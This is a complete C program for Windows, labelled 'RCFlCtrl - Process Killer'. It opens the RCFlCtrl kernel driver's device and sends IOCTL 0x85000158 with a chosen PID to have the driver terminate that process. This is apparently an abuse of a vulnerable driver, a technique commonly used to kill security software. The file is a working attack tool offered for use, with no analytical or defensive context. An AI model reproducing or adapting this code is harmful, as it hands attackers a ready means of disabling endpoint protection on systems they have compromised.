#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define IOCTL_KILL 0x85000158

void banner()
{
    puts("================================");
    puts("   RCFlCtrl - Process Killer");
    puts("================================");
}

int main(int argc, char* argv[])
{
    banner();

    if (argc < 2)
    {
        printf("Usage: %s <PID>\n", argv[0]);
        printf("Example: %s 1337\n", argv[0]);
        return 1;
    }

    ULONG64 pid = (ULONG64)_atoi64(argv[1]);
    if (pid == 0 || pid == 4)
    {
        printf("[!] Invalid PID: %llu\n", pid);
        return 1;
    }
    printf("[+] Target PID: %llu\n", pid);

    HANDLE hDevice = CreateFileA("\\\\.\\RCFlCtrl",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        puts("[!] Failed to open driver handle");
        return 1;
    }
    puts("[+] Driver handle opened");

    DWORD returned;
    if (DeviceIoControl(hDevice, IOCTL_KILL, &pid, sizeof(ULONG64),
        NULL, 0, &returned, NULL))
        printf("[+] Killed PID %llu\n", pid);
    else
        printf("[-] Failed to kill PID %llu\n", pid);

    CloseHandle(hDevice);

    return 0;
}
